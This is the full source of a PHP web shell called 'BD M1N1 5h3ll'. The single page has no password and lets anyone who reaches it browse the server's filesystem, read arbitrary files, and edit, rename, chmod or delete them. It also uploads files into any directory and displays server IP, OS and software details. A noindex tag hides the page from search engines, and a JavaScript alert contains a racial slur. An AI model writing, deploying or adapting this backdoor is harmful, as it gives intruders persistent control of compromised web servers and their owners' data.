<?php
	
	error_reporting(0);
	
	$error = "";
	
	
	function yourip()
	{
		echo $_SERVER['REMOTE_ADDR'];
	}
	
	function serverip()
	{
		echo getenv('SERVER_ADDR');
	}
	
	function servertime()
	{
		
		$date = date('d M Y');
		
		$time = date('h:i:s');
		
		echo $date.' '.$time;
	}
	
	function systeminfo()
	{
		echo php_uname();
	}
	
	function phpVer()
	{
		$ver = @phpversion();
		
		echo 'PHP '.$ver;
	}
	
	function serverapp()
	{
		echo $_SERVER['SERVER_SOFTWARE'];
	}
	
	function perms($file)
	{
		$perms = fileperms($file);
		if(($perms & 0xC000) == 0xC000)
		{
			$info = 's';
		}elseif(($perms & 0xA000) == 0xA000)
		{
			$info = 'l';
		} elseif(($perms & 0x8000) == 0x8000)
		{
			$info = '-';
		}elseif(($perms & 0x6000) == 0x6000)
		{
			$info = 'b';
		}elseif(($perms & 0x4000) == 0x4000)
		{
			$info = 'd';
		}elseif(($perms & 0x2000) == 0x2000)
		{
			$info = 'c';
		}elseif(($perms & 0x1000) == 0x1000)
		{
			$info = 'p';
		} else
		{
			$info = 'u';
		}
		
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
		return $info;
	}
	
?>
<!DOCTYPE html>
 <head>
	 <title>BD 5H3ll</title>
	 <meta charset="UTF-8"/>
	 <meta name= "robots" content= "noindex, nofollow, noarcive"/>
	 <link rel="stylesheet" href="" type="text/css"/>
	 <link href="https://fonts.googleapis.com/css?family=Ubuntu+Mono" rel="stylesheet">
	 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
	 <style>
	 	*{
	 			font-family: 'Ubuntu Mono', monospace;
	 			margin: 0;
	 			padding:0;
	 			border:0;
	 			-webkit-box-sizing: border-box;
	 			-moz-box-sizing: border-box;
	 			font-size: 12px;
	 			font-weight: normal;
	 		}
	 		input:focus, select:focus, textarea:focus, button:foucs
	 		{
	 			outline: none;
	 		}
	 		html, body
	 		{
	 			width: 100%;
	 			height: 100%;
	 			color: #222222;
	 		}
	 		body
	 		{
	 			background-color: #f0f0f0;
	 			line-height: 17px;
	 		}
	 		a
	 		{
	 			text-decoration: none;
	 			color: #fff;
	 		}
	 		a:hover
	 		{
	 			color: red;
	 			text-decoration: none;
	 			cursor: pointer;
	 		}
	 		p
	 		{
	 			padding: 8px 0;
	 		}
	 		table
	 		{
	 			width: 100%;
	 		}
	 		table td, table th
	 		{
	 			vertical-align: middle;
	 			padding: 6px;
	 		}
	 		textarea, input, select
	 		{
	 			background: #fff;
	 			padding: 8px;
	 			border-radius: 8px;
	 			color: #111;
	 			border: 1px solid #ddd;
	 		}
	 		textarea
	 		{
	 			resize: vertical;
	 			width: 100%;
	 			height: 300px;
	 			min-height: 300px;
	 			max-width: 100%;
	 			min-width: 100%;
	 		}
	 		hr
	 		{
	 			margin: 8px 0;
	 			border-bottom: 1px dahsed #ddd;
	 		}
	 		video
	 		{
	 			width: 100%;
	 			background: #222;
	 			border-radius: 8px;
	 		}
	 		h1, h2
	 		{
	 			background: #e7e7;
	 			border-bottom: 1px solid #ccc;
	 			color: #000;
	 			border-radius: 8px;
	 			text-align: center;
	 			cursor: pointer;
	 			padding: 8px;
	 			margin-bottom: 8px;
	 		}
	 		h1 a, h2 a
	 		{
	 			color: #000;
	 		}
	 		pre
	 		{
	 			word-break: break-all;
	 			word-wrap: break-word;
	 		}
	 		pre
	 		{
	 			white-space: pre-wrap;
	 		}
	 		#bds
	 		{
	 			cursor: pointer;
	 		}
	 		#header
	 		{
	 			width: 100%;
	 			position: fixed;
	 		}
	 		#headerNav
	 		{
	 			padding: 10px 8px 6px 8px;
	 			background: #333;
	 		}
	 		#headerNav a
	 		{
	 			 color: #efefef;
	 		}
	 		#menu
	 		{
	 			background: #006600;
	 			height: 33px;
	 			border-bottom: 3px solid red;
	 		}
	 		#menu .menuitem
	 		{
	 			float: left;
	 			padding: 7px 12px 6px 12px;
	 			height: 30px;
	 			background: #006600;
	 			color: #fff:
	 			cursor: pointer;
	 		}
	 		#menu .menuitem:hover, #menu .menuitemSelected
	 		{
	 			background: green;
	 			color: red;
	 			font-weight: bold;
	 		}
	 		#menu .menuitemSelected
	 		{
	 			background: #768999;
	 		}
	 		#basicinfo
	 		{
	 			width:100%; 
	 			padding:8px; 
	 			border-bottom:1px dashed #dddddd;
	 		}
	 		#content
	 		{
	 			background:#f0f0f0;
	 			height:100%;
	 			padding:66px 8px 8px 8px;
	 		}
	 		#content .menucontent
	 		{
	 			background:#f0f0f0;
	 			clear:both;
	 			display:none;
	 			padding:8px;
	 			overflow-x:auto;
	 			overflow-y:hidden;
	 		}
	 		#logout
	 		{
	 			float: right;
	 		}
	 		.boxclose
	 		{
	 			background:#222222;
	 			border-radius:3px;
	 			margin-right:8px;
	 			margin-top:-3px;
	 			padding:2px 8px;
	 			cursor:pointer;
	 			color:#ffffff;
	 		}
	 		.text
	 		{
	 			 color: green;
	 		}
	 		.text2
	 		{
	 			color: red;
	 		}
	 		.title
	 		{
	 			background: #ddd;
	 			border: 1px solid #ccc;
	 			color: red;
	 			border-radius: 8px;
	 			text-align: center;
	 			cursor: pointer;
	 		}
	 		.title a, .title a:hover
	 		{
	 			color: #000;
	 		}
	 		.boxtbl
	 		{
	 			border: 1px solid #ddd;
	 			border-radius: 8px;
	 			padding-bottom: 8px;
	 			background: #;
	 		}
	 		.boxtbl td
	 		{
	 			vertical-align: middle;
	 			padding: 8px 15px;
	 			border-bottom: 1px dashed #ddd;
	 		}
	 		.boxtbl input, .boxtbl select, .boxtbl .button
	 		{
	 			width: 100%;
	 		}
	 		.button
	 		{
	 			min-width: 120px;
	 			width: 120px;
	 			margin: 2px;
	 			color: #fff;
	 			background: #7c94ab;
	 			border: none;
	 			padding: 8px;
	 			border-radius: 8px;
	 			display: block;
	 			text-align: center;
	 			cursor: pointer;
	 		}
	 		.button:hover
	 		{
	 			background: green;
	 			color: red;
	 			font-weight: bold;
	 		}	
	 		#upload
	 		{
	 			display: none;
	 		}
	 		#rawbox
	 		{
	 			display: block;
	 		}
	 </style>
 </head>
	 <body>
		<div id="wrapper">
			<div id="header">
				<div id="headerNav">
					<span>
						<a href="#">
								BD M1N1 5h3ll 0.0.1
						</a>
					</span>
					
					<div style="color: white; display: inline-block; margin-left: 10px;">
						<?php
							
							if(isset($_GET['path']))
							{
								$path = $_GET['path'];
							} else
							{
								$path = getcwd();
							}
							
							$path = str_replace('\\', '/', $path);
							
							$paths = explode('/', $path);
							
							foreach($paths as $id=>$pat)
							{
								if($pat == '' && $pat == 0)
								{
									$a = true;
									echo '<a href="?path=/">/</a>';
									continue;
								}
								
								if($pat == '') continue;
								 
								echo '<a href="?path=';
									for($i=0; $i<=$id; $i++)
									{
											echo $paths[$i];
											if($i != $id) echo '/';
									}
								echo '">'.$pat.'</a>/';								
								
							}
							
						?>
					</div>
				</div>
				
				<div id="menu">
					<a class="menuitem" id="expl" href="#!explorer">
						Explorer
					</a>
					<a class="menuitem" id="upll" href="#!upload">
						Upload
					</a>
				</div>
				
				
			</div>
		</div><!---End Header ----->
		
		<div id="content">
			<div id="basicinfo">
				<div id="toggleBasicInfo"></div>
				<div></div>
				Server IP : <?php echo serverip(); ?> <span style='color: red;'>|</span> Your IP : <?php echo yourip(); ?>
<br/>
Time <span style='color: red;'>@</span> Server : <?php echo servertime(); ?>
<br/>
<?php echo systeminfo(); ?>
</br>
<?php echo serverapp(); ?> <span style='color: red;'>|</span> <?php echo phpVer(); ?>
			</div>
			<!----<center>
				<font size= "3">
					Directory Isn't readable.
				</font>
			</center>----->
			<?php
				
				if(isset($_GET['fileraw']))
				{
					echo '
							<table id="rawbox" class="boxtbl">
				<thead>
					<tr>
						<th colspan= "2">
							<p class="title">
								Code Raw
							</p>
						</th>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td colspan="2">';
							echo('<pre>'.htmlspecialchars(file_get_contents($_GET['fileraw'])).'</pre>');
						
						echo '</td>
					</tr>
				</tbody>
			</table>';
				} elseif(isset($_GET['option']) && $_POST['opt'] != 'delete')
				{
					echo '<center>'.$_POST['path'].'<br/><br/>';
					if($_POST['opt'] == 'chmod')
					{
						if(isset($_POST['perm']))
						{
							if(chmod($_POST['path'], $_POST['perm']))
							{
								echo '<font color="green">Chnage Permission Done</font>';
							}else
							{
								echo '<font color="red">Chnage Permission Error</font>';
							}
						}
						
						echo '<form method="post">Permission: <input type="" name="perm" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'"/><input type="hidden" name="path" value="'.$_POST['path'].'"> <input type="hidden" name="opt" value="chmod"> <input type="submit" value="Go" /> </form>';
						
					} elseif($_POST['opt'] == 'rename')
					{
						if(isset($_POST['newname']))
						{
							if(rename($_POST['path'], $path.'/'.$_POST['newname']))
							{
								echo '<font color="green">Change Name Done.</font><br />';
							} else
							{
								echo '<font color="red">Change Name Error.</font><br />';
							}
							
							$_POST['name'] = $_POST['newname'];
							
						}
						echo '<form method="POST"> New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" /> <input type="hidden" name="path" value="'.$_POST['path'].'"> <input type="hidden" name="opt" value="rename"> <input type="submit" value="Go" /> </form>';
					}elseif($_POST['opt'] == 'edit')
					{
						if(isset($_POST['src']))
						{
							$fp = fopen($_POST['path'], 'w');
							if(fwrite($fp, $_POST['src']))
							{
								echo '<font color="green">Edit File Done ~_^.</font><br />';
							} else
							{
								echo '<font color="green">Edit File Error ~_^.</font><br />';
							}	
							fclose($fp);
						}
						
						echo '<form method="POST"> <textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br /> <input type="hidden" name="path" value="'.$_POST['path'].'"> <input type="hidden" name="opt" value="edit"> <input type="submit" value="Go" /> </form>';
						
					}
					echo '</center>';
				}else
				{
					if(isset($_GET['option']) && $_POST['opt'] == 'delete')
					{
						if($_POST['type'] == 'dir')
						{
							if(rmdir($_POST['path']))
							{
								echo '<font color="green">Delete Dir Done.</font><br />';
							}else
							{
								echo '<font color="red">Delete Dir Error.</font><br />';
							}
						}elseif($_POST['type'] == 'file')
						{
							if(unlink($_POST['path']))
							{
								echo '<font color="green">Delete File Done.</font><br />';
							}else
							{
								echo '<font color="green">Delete File Error.</font><br />';
							}
						}
					}
				}
				
			?>
		<section id="explorer" class="c">
			<form method= "post" id="myform" name= "myForm">
				<?php
							$scandir = scandir($path);
							
							echo '<table id="maintable" style="width: 100%;" align="center" cellpadding="3">
					<tr>
						<td colspan= "7">
							<center>
								<div id="showmydata">
									
								</div>
							</center>
						</td>
					</tr>
					<tr style="background-color: #ddd; color: red;">
						<td colspan= "8" align="center">
								Listing Folder
						</td>
					</tr>
					<tr style="background-color: #ddd; height: 12px;">
						<th>Name</th>
						<th>Size</th>
						<th>Permission</th>
						<th>Option</th>
					</tr>';
							
							foreach($scandir as $dir)
							{
								if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
								echo '<tr style="background-color: #ddd;" onMouseOver= "style.BackgroundColor="#000"" onMouseOut= "style.BackgroundColor= "#ddd"">
							<td class="info">';
							echo "<a href=\"?path=$path/$dir\"><font class=\"text\"><center>$dir</center></font></a>";
							echo '</td><td>
								<font class="text2">
									<center>
										DIR
									</center>
								</font>
							</td><td><center>';
							if(is_writable('$path/$dir')) echo '<font color="green">';
							elseif(!is_readable($path/$dir)) echo '<font color="red">';
							echo perms('$path/$dir');
							if(is_writable('$path/$dir') || !is_readable('$path/$dir')) echo '</font>';
							echo '</center></td><td>
								<font class="text2">
									<center>';
										echo "<form action=\"?option&path=$path\" method= \"post\">";
											echo '<select name="opt">
											<option value="\">-----------</option>
											<option value="delete">Delete</option>
											<option value="chmod">Chmod</option>
											<option value="rename">Rename</option>
											</select>
											
											<input type="hidden" name="type" value="dir">';
											echo "<input type=\"hidden\" name=\"name\" value=\"$dir\">
											<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">";
											echo '<input type="submit" value="Go">
										</form>
									</center>
								</font>	
							</td></tr>';
							
							} //foreach
							
							foreach($scandir as $file)
							{
								if(!is_file("$path/$file")) continue;
								$size = filesize("$path/$file")/1024;
								$size = round($size, 3);
								if($size >= 1024)
								{
									$size = round($size/1024, 2).' MB';
								}else
								{
									$size = $size.' KB';
								}//size
								
								echo '<tr style="background-color: #ddd;" onMouseOver= "style.BackgroundColor="#000"" onMouseOut= "style.BackgroundColor= "#ddd"">
							<td class="info">';
							echo "<a id=\"fileraw\" href=\"?fileraw=$path/$file&path=$path\"><font class=\"text\"><center>$file</center></font></a>";
							echo '</td>
							<td>
								<font class="text2">
									<center>
										'.$size.'
									</center>
								</font>
							</td><td><center>';
							if(is_writable("$path/$file")) echo '<p class="text">';
								elseif(!is_readable("$path/$file")) echo '<font color="red">';
								echo perms("$path/$file");
								if(is_writable("$path/$dir") || !is_readable("$path/$file")) echo '</font>';
								echo '<td>
								<font class="text2">
									<center>';
										echo "<form action=\"?option&path=$path\" method= \"post\">";
										echo	'<select name="opt">
											<option value="\">-----------</option>
											<option value="delete">Delete</option>
											<option value="chmod">Chmod</option>
											<option value="rename">Rename</option>
											<option value="edit">Edit</option>
											</select>
											
											<input type="hidden" name="type" value="file">';
											echo "<input type=\"hidden\" name=\"name\" value=\"$file\">
											<input type=\"hidden\" name=\"path\" value=\"$path/$file\">";
											echo '<input type="submit" value=">">
										</form>
									</center>
								</font>	
							</td></tr>';
							}
							
							echo '</table>';
							
						?>
			</form>
		</section>
			
			<section id="upload" class="content2">
			
				<?php
					if(isset($_FILES['file']))
					{
						if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name']))
						{
							 $error = '<font style="color: green;">File Was Uploaded.</font><br/>';
						} else
						{
							$error = '<font style="color: red;">File wont Uploaded.</font><br/>';
						}
					}
				?>
			
			<form method= "post" id = "file" enctype= "multipart/form-data">
				<table class="boxtbl">
				<thead>
					<tr>
						<th colspan= "2">
							<p class="title">
								Upload
							</p>
						</th>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td colspan= "2">
							<input type="file" name="file"/>
						</td>
					</tr>
					<tr>
						<td colspan= "2">
							<input class="button" id = "fileb" type="submit" value="Upload"/>
						</td>
					</tr>
				</tbody>
			</table>
			</form>
		</section>
			
		</div>
		
		
		
		<script type="text/javascript">
			$(
					function()
					{
						$('#upll').on('click',
								function()
								{
									$('#explorer').hide();
									$('#upload').css('display', 'block');
								}
							);
							
							$('#expl').on('click',
								function()
								{
									$('#upload').hide();
									$('#explorer').css('display', 'block');
								}
							);
							
							$('#fileraw').on('click',
								function()
								{
									$('#eplorer').hide();
									$('#rawbox').css('display', 'block');
								}
							);
							
							$('#fileb').click(
								function()
								{
									alert('File was Uploaded Nigga');
								}
							);
					}
				)
		</script>
	 </body>
 </html>